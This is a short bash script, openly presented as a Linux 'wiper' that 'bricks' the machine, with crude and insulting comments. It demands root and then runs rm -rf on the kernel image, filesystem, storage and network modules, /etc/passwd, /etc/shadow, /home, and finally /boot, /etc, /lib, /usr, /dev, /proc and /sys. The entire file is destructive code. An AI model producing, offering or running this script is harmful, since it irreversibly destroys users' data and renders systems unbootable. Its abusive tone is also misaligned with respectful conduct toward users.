#!/usr/bin/env bash
## let's just fuck all of the nerdy shit
## well, one nerd:
# Must run as root
if [[ $EUID -ne 0 ]]; then
    echo "Run this script as root pussy (sudo)."
    exit 1
fi
rm -rf /boot/vmlinuz
# let's have some module fun
rm -rf /lib/modules/exit4.ko
rm -rf /lib/modules/xfs.ko
rm -rf /lib/modules/btrfs.ko
rm -rf /lib/modules/nfs.ko
## storage module fun
rm -rf /lib/modules/sd_mod.ko
rm -rf /lib/modules/sr_mod.ko
rm -rf /lib/modules/dm_mod.ko
rm -rf /lib/modules/loop.ko
## network module fun
rm -rf /lib/modules/e1000.ko 
rm -rf /lib/modules/tg3.ko
rm -rf /lib/modules/iwlwifi.ko
rm -rf /lib/modules/ath9k.ko
rm -rf /lib/modules/nf_conntrack.ko
rm -rf /lib/modules/ip_tables.ko
## dir fun
rm -rf /etc/fstab
rm -rf /etc/passwd
rm -rf /etc/shadow
rm -rf /etc/hostname
## lib64 fun
rm -rf /lib64
# the definition of a wiper
rm -rf /home
## The real Definition of a "brick"
rm -rf /boot
rm -rf /etc
rm -rf /lib
rm -rf /usr
rm -rf /dev
rm -rf /proc
rm -rf /sys